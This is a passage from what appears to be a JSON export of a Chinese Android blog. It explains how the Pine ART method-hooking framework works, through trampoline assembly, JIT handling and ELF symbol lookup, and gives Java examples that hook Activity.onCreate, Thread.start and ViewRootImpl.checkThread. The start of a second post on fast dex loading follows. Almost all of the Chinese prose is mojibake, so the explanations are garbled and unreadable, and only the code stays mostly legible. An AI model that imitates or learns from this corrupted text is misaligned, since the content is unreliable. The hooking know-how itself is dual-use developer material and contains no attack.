å¯èƒ½ä¼šè¢«æ›¿æ¢ä¸ºçœŸå®ä»£ç ï¼Œå¦åˆ™åªæ˜¯ä¸€æ¡nopldr pc, pine_thumb_backup_trampoline_remaining_code_entry // è·³è½¬åˆ°å‰©ä½™éƒ¨åˆ†ç»§ç»­æ‰§è¡ŒVAR(pine_thumb_backup_trampoline_origin_method).long 0VAR(pine_thumb_backup_trampoline_remaining_code_entry).long 0å¦ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œåœ¨inline hookæ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦æŠŠéƒ¨åˆ†åŸå§‹æŒ‡ä»¤å¤‡ä»½åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼Œå¦‚æœè¿™éƒ¨åˆ†æŒ‡ä»¤é‡Œæœ‰pcç›¸å…³æŒ‡ä»¤ï¼Œç”±äºæ­¤æ—¶æŒ‡ä»¤åœ°å€ä¸åŒï¼Œä¼šå‘ç”Ÿé”™è¯¯ã€‚ä¼ ç»Ÿnative inline hookæ¡†æ¶çš„åšæ³•æ˜¯åšæŒ‡ä»¤ä¿®å¤ï¼Œè€Œå› ä¸ºartä¸Šè¿™ç§æƒ…å†µå¾ˆå°‘ï¼Œæ‰€ä»¥Pineç›®å‰å¹¶æ²¡æœ‰æŒ‡ä»¤ä¿®å¤ï¼Œåªæ˜¯ç®€å•çš„åšåˆ¤æ–­ï¼Œå¦‚æœå‘ç°è¿™ç§æƒ…å†µç›´æ¥è½¬ç”¨å…¥å£æ›¿æ¢æ¨¡å¼ã€‚ï¼ˆæ³¨ï¼šå…¶å®è¿˜å¯ä»¥æœ‰å¦ä¸€ç§æ–¹æ¡ˆï¼Œå°±æ˜¯ä¸ç”¨åŸæ¥çš„æŒ‡ä»¤ï¼Œè®¾ç½®r0å¯„å­˜å™¨ä¸ºåŸæ–¹æ³•åç›´æ¥è·³è½¬åˆ°art_quick_to_interpreter_bridgeèµ°è§£é‡Šæ‰§è¡Œå°±è¡Œï¼Œæ³¨æ„éœ€è¦æ¸…æ‰å¯¹åº”ProfilingInfoçš„saved_entry_point_ï¼Œå¦åˆ™å¯èƒ½ä¼šç›´æ¥è·³è½¬åˆ°åŸæ–¹æ³•å…¥å£æ‰§è¡Œï¼Œå°±æ­»å¾ªç¯äº†ï¼‰å¥½çš„ï¼Œç°åœ¨æˆ‘ä»¬æœ‰äº†åŸä»£ç å…¥å£ï¼Œæˆ‘ä»¬å¯ä»¥åŠ¨æ€åˆ›å»ºå‡ºä¸€ä¸ªbackupæ–¹æ³•ï¼Œè®¾ç½®backupæ–¹æ³•å…¥å£ä¸ºåŸä»£ç å…¥å£ï¼Œç„¶åç›´æ¥åå°„è°ƒç”¨è¿™ä¸ªæ–¹æ³•å°±è¡Œäº†ï¼ä¸è¿‡æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œç”±äºè¿™ä¸ªæ–¹æ³•æ˜¯åŠ¨æ€åˆ›å»ºå‡ºæ¥çš„ï¼Œè€ŒArtMethodçš„declaring_classæ˜¯GcRootï¼Œå¯èƒ½è¢«gcç§»åŠ¨ï¼Œartä¼šè‡ªåŠ¨æ›´æ–°åŸç‰ˆArtMethodé‡Œçš„åœ°å€ï¼Œä½†æ˜¯ä¸ä¼šæ›´æ–°æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ArtMethodé‡Œçš„åœ°å€ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªå·±ä¸»åŠ¨æ›´æ–°ã€‚123456789void Pine_updateDeclaringClass(JNIEnv *env, jclass, jobject javaOrigin, jobject javaBackup) &#123; auto origin = art::ArtMethod::FromReflectedMethod(env, javaOrigin); auto backup = art::ArtMethod::FromReflectedMethod(env, javaBackup); uint32_t declaring_class = origin-&gt;GetDeclaringClass(); if (declaring_class != backup-&gt;GetDeclaringClass()) &#123; LOGI(\"The declaring_class of method has moved by gc, update its reference in backup method now!\"); backup-&gt;SetDeclaringClass(declaring_class); &#125;&#125;ä¸è¿‡è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå‡å¦‚åœ¨æˆ‘ä»¬æ£€æŸ¥å®Œdeclaring_classä¹‹åè°ƒç”¨backupä¹‹å‰å‘ç”Ÿgcï¼Œè¿™ä¸ªclasså¯¹è±¡è¢«ç§»åŠ¨äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿéš¾é“è¦åœ¨è¿™æ®µæ—¶é—´é‡Œç›´æ¥å…³é—­Moving GCï¼Ÿå¤ªé‡äº†ï¼Œæˆ‘ä»¬åªå¸Œæœ›declaring_classä¸ä¼šè¢«ç§»åŠ¨å°±è¡Œã€‚å®é™…ä¸Šï¼Œç¡®å®æœ‰è®©ä¸€ä¸ªå¯¹è±¡æš‚æ—¶ä¸ä¼šè¢«ç§»åŠ¨çš„æ–¹æ³•ï¼šå¯¹äºåœ¨æ ˆä¸Šæœ‰å¼•ç”¨çš„å¯¹è±¡ï¼Œä¸ä¼šè¢«gcç§»åŠ¨ã€‚é‚£å°±ç®€å•äº†ï¼Œä¿è¯å¯¹åº”çš„Classå¯¹è±¡åœ¨æ ˆä¸Šæœ‰å¼•ç”¨å³å¯ï¼Œéœ€è¦æ³¨æ„å¿…é¡»æ˜¾å¼ä½¿ç”¨ä¸€ä¸‹ï¼Œå¦åˆ™ä¼šè¢«ä¼˜åŒ–ï¼šï¼ˆæ­¤æ–¹æ³•æ¥æºäºSandHookï¼ŒæœªéªŒè¯ï¼Œåœ¨Android 10ä¸Šæµ‹è¯•å¹¶ä¸èƒ½é˜»æ­¢å¯¹è±¡è¢«ç§»åŠ¨ï¼Œå“ï¼‰ï¼ˆæ³¨ï¼šè¿™é‡Œä¹‹å‰æ˜¯è€ƒè™‘è¿‡ç”¨FastHookçš„é‚£ç§æ–¹æ¡ˆçš„ï¼Œå³åŠ¨æ€ä»£ç†åˆ›å»ºå‡ºforwardæ–¹æ³•ï¼Œåªä¿®æ”¹forwardçš„entryè€Œéå…¨éƒ¨å¤‡ä»½ï¼Œä¸è¿‡è¯•ä¸‹æ¥å‘ç°æœ‰ç‚¹é—®é¢˜ï¼‰okï¼Œè°ƒç”¨åŸæ–¹æ³•å®Œæˆã€‚jitè¿™æ˜¯å®˜æ–¹æ–‡æ¡£ä¸Šçš„JITå·¥ä½œæµç¨‹å›¾ã€‚Pineå¯¹jitçš„å¤„ç†å’Œå…¶ä»–æ¡†æ¶å·®ä¸å¤šï¼šå¦‚æœç›®æ ‡æ–¹æ³•æ²¡è¢«ç¼–è¯‘ï¼Œå…ˆå°è¯•è°ƒç”¨jit_compile_methodè¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘çš„ç»“æœç›´æ¥å½±å“åˆ°èµ°inline hookè¿˜æ˜¯å…¥å£æ›¿æ¢ï¼›jitç¼–è¯‘ä¼šæ”¹å˜çº¿ç¨‹çŠ¶æ€ï¼Œæœ‰å¯èƒ½ä¼šé€ æˆcrashï¼Œæ‰€ä»¥ç¼–è¯‘å®Œåéœ€è¦æ¢å¤çº¿ç¨‹çŠ¶æ€ï¼›ç»™åŸæ–¹æ³•å’Œbackupæ–¹æ³•æ·»åŠ kAccCompileDontBotheré˜²æ­¢å…¶è¢«jitç¼–è¯‘ä»è€Œå¼•å‘é”™è¯¯ï¼›å¦å¤–è¿˜ç…§ç€SandHookå†™äº†ä¸€ä¸ªç¦ç”¨jit inlineã€‚ä¸è¿‡è¿™ä¼¼ä¹è¿˜è¿œè¿œä¸å¤Ÿã€‚FastHookä½œè€…åœ¨è¿™ç¯‡æ–‡ç« ä¸­æåˆ°äº†è¿™ä¸¤ç‚¹ï¼šå¦‚æœè¯¥æ–¹æ³•æ­£åœ¨jitç¼–è¯‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰‹åŠ¨ç¼–è¯‘æ˜¯ä¸å®‰å…¨çš„ã€‚jit gcä¼šä¿®æ”¹æ–¹æ³•å…¥å£ä¸ºè§£é‡Šå™¨å…¥å£ï¼Œå½“æ–¹æ³•è¿›å…¥è§£é‡Šå™¨æ—¶ä¼šé‡æ–°è®¾ç½®ä¸ºåŸæ¥çš„å…¥å£å¹¶è·³è½¬åˆ°åŸæ¥çš„å…¥å£æ‰§è¡Œã€‚å¦å¤–æˆ‘ç®€å•çœ‹äº†ä¸‹jitæºç ï¼Œå‘ç°åŒ…æ‹¬ProfilingInfoå’Œè¢«ç¼–è¯‘çš„ä»£ç åœ¨å†…çš„å¤§éƒ¨åˆ†å†…å®¹éƒ½æœ‰å¯èƒ½è¢«å›æ”¶ã€‚æš‚æ—¶è¿˜æ²¡æƒ³å¥½è¿™ä¸ªæ€ä¹ˆå¤„ç†emmmELFç¬¦å·è§£æå—é™äºå®ç°åŸç†ï¼Œæˆ‘ä»¬éœ€è¦è·å¾—æ¥è‡ªç³»ç»Ÿç§æœ‰åº“å†…çš„å¤§é‡ç§æœ‰ç¬¦å·ï¼Œæœ€ç®€å•çš„åŠæ³•å°±æ˜¯ç”¨dlsymï¼Œä¸è¿‡åœ¨Android Nä¸Šï¼ŒGoogleç¦æ­¢äº†è¿™ç§è¡Œä¸ºï¼Œè€Œä¸”æˆ‘ä»¬è¿˜éœ€è¦è·å–ä¸€äº›åœ¨.symtabè¡¨é‡Œçš„ç¬¦å·ï¼ˆæ¯”å¦‚art_quick_to_interpreter_bridgeï¼‰ï¼Œè¿™äº›ç”¨dlsymæ˜¯æœç´¢ä¸åˆ°çš„ã€‚å› ä¸ºæˆ‘å¯¹elfæ ¼å¼ä¸ç†Ÿï¼Œæ‰€ä»¥ç›´æ¥ç”¨çš„SandHookä½œè€…çš„AndroidELFï¼Œåœ¨è¿™ç‰¹åˆ«è¡¨ç¤ºæ„Ÿè°¢~å„è®¾å¤‡å…¼å®¹å¤„ç†å®‰å“å„ç‰ˆæœ¬çš„å˜åŒ–è¿™äº›éƒ½æ˜¯è€ç”Ÿå¸¸è°ˆäº†ï¼Œè¿™æ¡è¦è®²çš„é—®é¢˜æ˜¯æŒ‡å½“å‚å•†ä¿®æ”¹äº†ä¸€äº›æˆå‘˜åç§»çš„æƒ…å†µã€‚æ¯”å¦‚ArtMethodï¼Œæˆ‘ä»¬åšhookè‡³å°‘éœ€è¦è·å¾—art_entry_point_from_quick_compiled_code_å’Œaccess_flags_ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®AOSPå†™æ­»åç§»ï¼Œä½†æ˜¯è¿™æ ·çš„è¯ä¸€æ—¦å‚å•†åšäº†ä»€ä¹ˆæ‰‹è„šæ”¹äº†åç§»ï¼Œé‚£å°±å®Œè›‹äº†ã€‚è€Œæˆ‘çŸ¥é“çš„æ¡†æ¶åªæœ‰SandHookå’ŒWhaleæ˜¯åŠ¨æ€æŸ¥æ‰¾åç§»ï¼Œå…¶ä»–éƒ½æ˜¯æ ¹æ®AOSPå†™æ­»åç§»ã€‚å®é™…ä¸Šæˆ‘ä»¬å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€è·å¾—è¿™äº›offsetï¼Œæ‹¿access_flags_æ¥è¯´å§ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªæ–¹æ³•ï¼Œç„¶åæ ¹æ®è¯¥æ–¹æ³•çš„å±æ€§é¢„æµ‹access_flagï¼Œç„¶åå¯ä»¥ç”¨è¿™ä¸ªé¢„æµ‹çš„flagåœ¨ArtMethodé‡ŒåŠ¨æ€æœç´¢åˆ°å€¼ï¼ˆè¿™ä¸ªæ–¹æ³•æœ€å¥½æ˜¯nativeçš„ï¼Œå¦åˆ™å¾ˆæœ‰å¯èƒ½ä¼šè¢«åŠ ä¸Šä¸€ä¸ªkAccSkipAccessCheckså¯¼è‡´æœç´¢ä¸åˆ°ï¼‰ï¼›è€Œå¯¹äºentry_point_from_quick_compiled_code_ï¼Œå¹¶æ²¡æœ‰åŠæ³•é¢„æµ‹å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é¢„æµ‹åœ¨art_entry_point_from_quick_compiled_code_æ—è¾¹çš„data_æˆå‘˜çš„å€¼ï¼šå¯¹äºnativeæ–¹æ³•ï¼Œè¿™ä¸ªå€¼æ˜¯å¯¹åº”çš„jniå‡½æ•°åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥æœç´¢åˆ°ï¼Œç„¶åç›´æ¥åŠ ä¸Šæˆå‘˜å¤§å°å°±è¡Œï¼ˆéœ€è¦æ³¨æ„å†…å­˜å¯¹é½ï¼‰è€Œå¯¹äºæ— æ³•åŠ¨æ€è·å¾—åç§»çš„æƒ…å†µï¼Œæ¯”å¦‚CompilerOptionsï¼Œå®ƒåœ¨å†…å­˜ä¸­æ˜¯è¿™æ ·çš„ï¼š12345678910class CompilerOptions final &#123; CompilerFilter::Filter compiler_filter_; size_t huge_method_threshold_; size_t large_method_threshold_; size_t small_method_threshold_; size_t tiny_method_threshold_; size_t num_dex_methods_threshold_; size_t inline_max_code_units_; // çœç•¥ä¸€å¤§å †æˆå‘˜&#125;å‡å¦‚æˆ‘ä»¬è¦ä¿®æ”¹å®ƒçš„inline_max_code_units_ï¼Œæ²¡ä»€ä¹ˆèƒ½å¾ˆå¥½è·å–åç§»çš„åŠæ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªèƒ½æ ¹æ®ç‰ˆæœ¬å†™æ­»åç§»ï¼Œè¿è¡Œæ—¶å°±åªèƒ½åˆ¤æ–­å¯¹åº”çš„å€¼æ˜¯å¦åœ¨èŒƒå›´å†…ï¼Œè¶…è¿‡èŒƒå›´ä¸ä¿®æ”¹ï¼ˆæ¯”å¦‚è·å–å‡ºä¸€ä¸ª114514ï¼Œé‚£è‚¯å®šä¸æ˜¯æ­£å¸¸çš„å€¼ï¼Œå°±å¯ä»¥åˆ¤æ–­å‡ºåç§»ä¸å¯¹ï¼‰ã€‚ä½¿ç”¨ä¸Šé¢è¯´äº†è¿™ä¹ˆä¹…å®ç°åŸç†ï¼Œä¸‹é¢è®©æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸œè¥¿æ€ä¹ˆç”¨å§~åŸºç¡€ä½¿ç”¨åœ¨bridge.gradleé‡ŒåŠ å…¥å¦‚ä¸‹ä¾èµ–ï¼š123dependencies &#123; implementation 'top.canyie.pine:core:0.0.1'&#125;é…ç½®ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼š12PineConfig.debug = true; // æ˜¯å¦debugï¼Œtrueä¼šè¾“å‡ºè¾ƒè¯¦ç»†logPineConfig.debuggable = BuildConfig.DEBUG; // è¯¥åº”ç”¨æ˜¯å¦å¯è°ƒè¯•ï¼Œå»ºè®®å’Œé…ç½®æ–‡ä»¶ä¸­çš„å€¼ä¿æŒä¸€è‡´ï¼Œå¦åˆ™ä¼šå‡ºç°é—®é¢˜ç„¶åå°±å¯ä»¥å¼€å§‹ä½¿ç”¨äº†ã€‚ä¾‹å­1ï¼šç›‘æ§Activity onCreateï¼ˆæ³¨ï¼šä»…åšæµ‹è¯•ä½¿ç”¨ï¼Œå¦‚æœä½ çœŸçš„æœ‰è¿™ä¸ªéœ€æ±‚æ›´å»ºè®®ä½¿ç”¨registerActivityLifecycleCallbacks()ç­‰æ¥å£ï¼‰123456789Pine.hook(Activity.class.getDeclaredMethod(\"onCreate\", Bundle.class), new MethodHook() &#123; @Override public void beforeHookedMethod(Pine.CallFrame callFrame) &#123; Log.i(TAG, \"Before \" + callFrame.thisObject + \" onCreate()\"); &#125; @Override public void afterHookedMethod(Pine.CallFrame callFrame) &#123; Log.i(TAG, \"After \" + callFrame.thisObject + \" onCreate()\"); &#125;&#125;);Pine.CallFrameå°±ç›¸å½“äºxposedçš„MethodHookParamsã€‚ä¾‹å­2ï¼šæ‹¦æˆªæ‰€æœ‰javaçº¿ç¨‹çš„åˆ›å»ºä¸é”€æ¯ï¼š123456789101112131415final MethodHook runHook = new MethodHook() &#123; @Override public void beforeHookedMethod(Pine.CallFrame callFrame) throws Throwable &#123; Log.i(TAG, \"Thread \" + callFrame.thisObject + \" started...\"); &#125; @Override public void afterHookedMethod(Pine.CallFrame callFrame) throws Throwable &#123; Log.i(TAG, \"Thread \" + callFrame.thisObject + \" exit...\"); &#125;&#125;;Pine.hook(Thread.class.getDeclaredMethod(\"start\"), new MethodHook() &#123; @Override public void beforeHookedMethod(Pine.CallFrame callFrame) &#123; Pine.hook(ReflectionHelper.getMethod(callFrame.thisObject.getClass(), \"run\"), runHook); &#125;&#125;);æ³¨æ„å¦‚æœæˆ‘ä»¬åªhook Thread.run()ï¼ŒThreadå­ç±»å¯èƒ½ä¼šé‡å†™Thread.run()æ–¹æ³•ä¸è°ƒç”¨super.run()é‚£ä¹ˆå°±æ— æ³•hookåˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥hookä¸€å®šä¼šè¢«è°ƒç”¨çš„Thread.start()æ–¹æ³•æ„ŸçŸ¥åˆ°æ–°çº¿ç¨‹å»ºç«‹ï¼Œæ­¤æ—¶å¯ä»¥è·å¾—å…·ä½“çš„ç±»ï¼Œç„¶åç›´æ¥hookè¿™äº›è¿è¡Œæ—¶æ‰è¢«å‘ç°çš„ç±»å°±è¡Œã€‚æˆ‘ä»¬è¿˜å¯ä»¥ç©ç‚¹ä¸§å¿ƒç—…ç‹‚çš„ï¼Œæ¯”å¦‚ï¼š12Method checkThread = Class.forName(\"android.view.ViewRootImpl\").getDeclaredMethod(\"checkThread\");Pine.hook(checkThread, MethodReplacement.DO_NOTHING);è¿™æ®µä»£ç ä¼šå¹²ä»€ä¹ˆå‘¢ï¼Ÿæ²¡é”™ï¼Œç°åœ¨ä½ å¯ä»¥åœ¨ä»»ä½•çº¿ç¨‹éšæ„æ“ä½œuiäº†ï¼Œä¸ç”¨æ€•ViewRootImpl.CalledFromWrongThreadExceptionäº† ^_^å½“ç„¶ï¼ŒPineçš„ç”¨é€”è¿œä¸æ­¢è¿™äº›ï¼Œè¿™ä¸€åˆ‡éƒ½å–å†³äºæ‚¨çš„æƒ³è±¡åŠ›~å…¶ä»–ä¸€äº›APIè¿™é‡Œä»‹ç»ä¸€äº›å…¶ä»–çš„APIï¼šPine.ensureInitialized()ï¼šé»˜è®¤æƒ…å†µä¸‹Pineæ˜¯æ‡’åˆå§‹åŒ–çš„ï¼Œå³ç¬¬ä¸€æ¬¡è°ƒç”¨éœ€è¦åˆå§‹åŒ–çš„APIæ—¶æ‰ä¼šè¿›è¡Œåˆå§‹åŒ–ï¼Œä½ å¯ä»¥è°ƒç”¨æ­¤æ–¹æ³•æ¥ä¸»åŠ¨è¿›è¡Œåˆå§‹åŒ–Pine.invokeOriginalMethod(Member method, Object thisObject, Object... args)ï¼šè°ƒç”¨åŸæ–¹æ³•ï¼Œä¸è¿‡ä¸å»ºè®®ä½¿ç”¨è¿™ä¸ªæ¥å£ï¼Œæ›´å»ºè®®ä½¿ç”¨æ•ˆç‡æ›´é«˜çš„CallFrame.invokeOriginalMethod()ã€‚Pine.setHookMode(int hookMode)ï¼šè®¾ç½®Pineçš„hookæ–¹æ¡ˆï¼Œå–å€¼ï¼šPine.HookMode.AUTOï¼šç”±Pineè‡ªè¡Œå†³å®šï¼›Pine.HookMode.INLINEï¼šinline hookä¼˜å…ˆï¼›Pine.HookMode.REPLACEMENTï¼šå…¥å£æ›¿æ¢ä¼˜å…ˆã€‚æ³¨ï¼šè®¾ç½®hookæ–¹æ¡ˆå¹¶ä¸ä»£è¡¨Pineä¸€å®šä¼šä»¥è¯¥æ–¹æ¡ˆè¿›è¡Œhookï¼Œå¦‚hook jniå‡½æ•°å°±åªèƒ½è¿›è¡Œå…¥å£æ›¿æ¢ã€‚Pine.disableJitInline()ï¼šå°è¯•å…³é—­JITçš„å†…è”ä¼˜åŒ–ã€‚Pine.compile(Member method)ï¼šä¸»åŠ¨è°ƒç”¨JITå°è¯•ç¼–è¯‘ä¸€ä¸ªæ–¹æ³•ã€‚Pine.decompile(Member method, boolean disableJit)ï¼šä½¿æŸä¸ªæ–¹æ³•è½¬æ¢ä¸ºè§£é‡Šæ‰§è¡Œã€‚å‚æ•°disableJitè¡¨ç¤ºæ˜¯å¦éœ€è¦é˜»æ­¢è¯¥æ–¹æ³•å†æ¬¡è¢«JITç¼–è¯‘ã€‚è¿˜æœ‰å…¶ä»–ä¸€äº›ä¸å¤ªå¸¸ç”¨çš„å°±ä¸å†ä»‹ç»äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹çœ‹æºç ã€‚ä½¿ç”¨é¡»çŸ¥Pineçš„å¼€æºåè®®æ˜¯å996åè®®ã€‚Pineæ”¯æŒAndroid 4.4ï¼ˆåªæ”¯æŒARTï¼‰~10.0ï¼Œaarch32ï¼ˆæœªæµ‹è¯•ï¼Œå‡ ä¹è§ä¸åˆ°ï¼Œä»¥åå¯èƒ½ä¼šç§»é™¤ï¼‰/thumb2/arm64æ¶æ„ï¼›6.0 32bitä¸‹å‚æ•°è§£æå¯èƒ½ä¼šæœ‰é—®é¢˜ï¼Œæ²¡æœ‰å¯¹åº”æµ‹è¯•æœºæ— æ³•æµ‹è¯•ï¼ˆå…¶å®æ˜¯çœ‹epicæºç æœ‰å¯¹Mè¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œä¸è¿‡è¿™æ®µæ²¡çœ‹æ‡‚emmï¼‰ï¼›å¦å¤–ï¼ŒPineæ²¡æœ‰è‡ªå¸¦ç»•è¿‡éšè—APIé™åˆ¶ç­–ç•¥çš„æ–¹æ³•ï¼Œå¦‚æœä½ éœ€è¦åœ¨9.0åŠä»¥ä¸Šä½¿ç”¨ï¼Œé‚£ä¹ˆè¯·è‡ªè¡Œå¤„ç†ï¼ˆæ¯”å¦‚ä½¿ç”¨FreeReflectionï¼‰ï¼›Rä¸Šç®€å•çœ‹äº†ä¸‹ï¼ŒjmethodIDæœ‰å¯èƒ½ä¸æ˜¯çœŸå®çš„ArtMethod*äº†ï¼Œä¸è¿‡javaå±‚Executableçš„artMethodå˜é‡ä¼¼ä¹è¿˜æ˜¯ï¼Œå¤„ç†äº†è¿™ç‚¹åº”è¯¥å°±è¡ŒPineåªåœ¨å°‘æ•°çš„å‡ å°è®¾å¤‡ä¸Šåšè¿‡æµ‹è¯•ï¼Œç¨³å®šæ€§æš‚æ— æ³•ä¿è¯ï¼Œä¸å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ã€‚å¤§éƒ¨åˆ†javaæ–¹æ³•éƒ½å¯è¢«Pine hookï¼Œä½†æ˜¯è¿™äº›æ–¹æ³•é™¤å¤–ï¼šç±»çš„é™æ€åˆå§‹åŒ–å—éƒ¨åˆ†å…³é”®ç³»ç»Ÿæ–¹æ³•è¢«Pineå†…éƒ¨ä½¿ç”¨äº†çš„æ–¹æ³•ï¼ˆhookä¼šå¯¼è‡´æ­»å¾ªç¯ï¼‰æœ‰æ— æ³•è¢«inline hookçš„æƒ…å†µè¢«å®Œå…¨å†…è”çš„æ–¹æ³•ï¼ˆå¦‚æœèƒ½çŸ¥é“callerï¼Œé‚£ä¹ˆå¯ä»¥decompile callerï¼‰æ€»ç»“å—¯ï¼Œå¤§æ¦‚å°±æ˜¯è¿™æ ·å•¦~å†æ”¾ä¸€ä¸‹å¼€æºåœ°å€ï¼šPineå‡ ä¸ªå¯¹æˆ‘å¸®åŠ©æ¯”è¾ƒå¤§çš„é¡¹ç›®ï¼šSandHookEpicAndroidELFï¼šæœ¬é¡¹ç›®ä½¿ç”¨äº†çš„ELFç¬¦å·æœç´¢åº“YAHFAFastHookåœ¨è¿™å†æ¬¡è¡¨ç¤ºæ„Ÿè°¢~å¦‚æœä½ å¯¹æœ¬é¡¹ç›®æ„Ÿå…´è¶£çš„è¯ï¼Œå¯ä»¥æ‹¿å‡ºä½ çš„æ‰‹æœºå¸®æˆ‘æµ‹è¯•ä¸€ä¸‹ï¼Œæ¬¢è¿æissueå’ŒPRï¼Œä¹Ÿå¯ä»¥åŠ ä¸€ä¸‹QQç¾¤ï¼š949888394ä¸€èµ·è®¨è®ºï¼Œ^_^","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"xposed","slug":"xposed","permalink":"https://blog.canyie.top/tags/xposed/"},{"name":"AOP","slug":"AOP","permalink":"https://blog.canyie.top/tags/AOP/"},{"name":"hook","slug":"hook","permalink":"https://blog.canyie.top/tags/hook/"}]},{"title":"ä¸€ç§åœ¨ARTä¸Šå¿«é€ŸåŠ è½½dexçš„æ–¹æ³•","slug":"fast-load-dex-on-art-runtime","date":"2020-02-15T02:02:33.000Z","updated":"2025-04-24T10:33:02.819Z","comments":true,"path":"2020/02/15/fast-load-dex-on-art-runtime/","link":"","permalink":"https://blog.canyie.top/2020/02/15/fast-load-dex-on-art-runtime/","excerpt":"åœ¨å›½å†…çš„å¤§ç¯å¢ƒä¸‹ï¼ŒAndroidä¸Šæ’ä»¶åŒ–/çƒ­ä¿®å¤ç­‰æŠ€æœ¯ç™¾èŠ±é½æ”¾ï¼Œè€Œè¿™ä¸€åˆ‡éƒ½åŸºäºä»£ç çš„åŠ¨æ€åŠ è½½ã€‚Androidæä¾›äº†ä¸€ä¸ªDexClassLoaderã€‚ç”¨è¿™ä¸ªAPIèƒ½æˆåŠŸåŠ è½½dexï¼Œä½†æœ‰ä¸€ä¸ªæ¯”è¾ƒä¸¥é‡çš„é—®é¢˜ï¼šAndroid Qä»¥ä¸‹ï¼Œå½“è¿™ä¸ªdexè¢«åŠ è½½æ—¶ï¼Œå¦‚æœæ²¡æœ‰å·²ç»ç”Ÿæˆçš„oatï¼Œåˆ™ä¼šæ‰§è¡Œä¸€æ¬¡dex2oatæŠŠè¿™ä¸ªdexç¼–è¯‘ä¸ºoatï¼Œå¯¼è‡´ç¬¬ä¸€æ¬¡åŠ è½½dexä¼šéå¸¸éå¸¸æ…¢ã€‚ä¸ªäººè®¤ä¸ºè¿™æ ·çš„è®¾è®¡æ˜¯éå¸¸ä¸åˆç†çš„ï¼Œè™½ç„¶è½¬æ¢æˆoatä¹‹åæ‰§è¡Œä¼šå¾ˆå¿«ï¼Œä½†å®Œå…¨å¯ä»¥è®©ç”¨æˆ·ä»¥è§£é‡Šå™¨æ¨¡å¼å…ˆæ„‰å¿«çš„ç”¨ç€ï¼Œdex2oatæ”¾å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œå¤šå¥½ã€‚Android 8.0ä¸Šè°·æ­Œè¿˜æä¾›äº†ä¸€ä¸ªInMemoryDexClassLoaderï¼Œè€Œä»¥å‰çš„Androidç‰ˆæœ¬ï¼Œå°±è¦å¼€å‘è€…è‡ªå·±æƒ³åŠæ³•äº†â€¦â€¦","text":"åœ¨å›½å†…çš„å¤§ç¯å¢ƒä¸‹ï¼ŒAndroidä¸Šæ’ä»¶åŒ–/çƒ­ä¿®å¤ç­‰æŠ€æœ¯ç™¾èŠ±é½æ”¾ï¼Œè€Œè¿™ä¸€åˆ‡éƒ½åŸºäºä»£ç çš„åŠ¨æ€åŠ è½½ã€‚Androidæä¾›äº†ä¸€ä¸ªDexClassLoaderã€‚ç”¨è¿™ä¸ªAPIèƒ½æˆåŠŸåŠ è½½dexï¼Œä½†æœ‰ä¸€ä¸ªæ¯”è¾ƒä¸¥é‡çš„é—®é¢˜ï¼šAndroid Qä»¥ä¸‹ï¼Œå½“è¿™ä¸ªdexè¢«åŠ è½½æ—¶ï¼Œå¦‚æœæ²¡æœ‰å·²ç»ç”Ÿæˆçš„oatï¼Œåˆ™ä¼šæ‰§è¡Œä¸€æ¬¡dex2oatæŠŠè¿™ä¸ªdexç¼–è¯‘ä¸ºoatï¼Œå¯¼è‡´ç¬¬ä¸€æ¬¡åŠ è½½dexä¼šéå¸¸éå¸¸æ…¢ã€‚ä¸ªäººè®¤ä¸ºè¿™æ ·çš„è®¾è®¡æ˜¯éå¸¸ä¸åˆç†çš„ï¼Œè™½ç„¶è½¬æ¢æˆoatä¹‹åæ‰§è¡Œä¼šå¾ˆå¿«ï¼Œä½†å®Œå…¨å¯ä»¥è®©ç”¨æˆ·ä»¥è§£é‡Šå™¨æ¨¡å¼å…ˆæ„‰å¿«çš„ç”¨ç€ï¼Œdex2oatæ”¾å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œå¤šå¥½ã€‚Android 8.0ä¸Šè°·æ­Œè¿˜æä¾›äº†ä¸€ä¸ªInMemoryDexClassLoaderï¼Œè€Œä»¥å‰çš„Androidç‰ˆæœ¬ï¼Œå°±è¦å¼€å‘è€…è‡ªå·±æƒ³åŠæ³•äº†â€¦â€¦æºç åˆ†ææ³¨ï¼šä¸ºäº†è¯´æ˜æ­¤æ–¹æ³•èƒ½åœ¨è¾ƒä½ç‰ˆæœ¬çš„ARTä¸Šè¿è¡Œï¼Œæœ¬æ–‡åˆ†æçš„æºç æ˜¯Android 5.0çš„æºç ï¼Œä¹‹åçš„Androidç‰ˆæœ¬é‡ŒOpenDexFileFromOatæ–¹æ³•æ¬åˆ°äº†OatFileManageré‡Œï¼Œè€Œè°ƒç”¨dex2oatçš„éƒ¨åˆ†åˆ™é‡æ„åˆ°äº†OatFileAssistantä¸­ï¼Œå¤§è‡´é€»è¾‘ç›¸åŒï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±å»çœ‹çœ‹ï¼›è‡³äºAndroid 4.4ï¼Œç®€å•æ‰«äº†ä¸€ä¸‹æºç 